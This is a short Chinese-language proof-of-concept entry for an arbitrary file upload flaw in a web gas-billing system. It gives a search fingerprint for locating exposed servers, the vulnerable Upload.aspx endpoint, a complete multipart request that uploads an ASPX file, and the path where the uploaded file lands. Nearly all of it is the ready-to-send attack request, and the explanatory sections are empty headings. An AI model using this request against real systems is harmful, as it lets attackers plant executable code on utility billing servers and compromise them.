# 先锋WEB燃气收费系统AjaxService存在任意文件上传漏洞

- **系统**：先锋WEB燃气收费系统　|　**类型**：文件上传　|　**CVE**：—
- **指纹**：`app="先锋WEB燃气收费系统"`
- **请求**：`POST /AjaxService/Upload.aspx HTTP/1.1`
- **关键头**：`Content-Type: multipart/form-data; boundary=---------------------------380…`　`Content-Length: 710`

**请求体 / payload**
```
-----------------------------38002115147665341923847377752
Content-Disposition: form-data; name="Fdata"; filename="1ndex.aspx"
Content-Type: text/html
123
-----------------------------38002115147665341923847377752
Content-Disposition: form-data; name="submit"
Submin
-----------------------------38002115147665341923847377752--

上传文件位置
/UploadFile/202401/2024011004110066.aspx
```

**其他**
- 先锋WEB燃气收费系统AjaxService存在任意文件上传漏洞: * 一、漏洞简介
* 二、影响版本
* 三、资产测绘
* 四、漏洞复现
***
- 版本: * 先锋WEB燃气收费系统